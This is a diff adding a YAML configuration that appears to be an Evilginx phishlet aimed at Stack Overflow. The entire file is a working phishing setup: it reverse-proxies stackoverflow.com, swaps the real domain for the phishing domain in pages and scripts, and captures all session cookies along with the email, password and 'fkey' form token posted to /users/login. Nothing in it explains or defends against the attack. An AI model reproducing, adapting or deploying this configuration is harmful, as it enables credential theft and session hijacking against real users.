@@ -1,0 +1,31 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'stackoverflow.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stackoverflow.com', session: true, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'stackoverflow.com', orig_sub: '', domain: 'stackoverflow.com', search: 'stackoverflow.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'text/json']}
+auth_tokens:
+  - domain: 'stackoverflow.com'
+    keys: ['.*,regexp']
+  - domain: '.stackoverflow.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom: 
+    - key: 'fkey'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/'
+  - '/users/login'
+login:
+  domain: 'stackoverflow.com'
+  path: '/users/login'
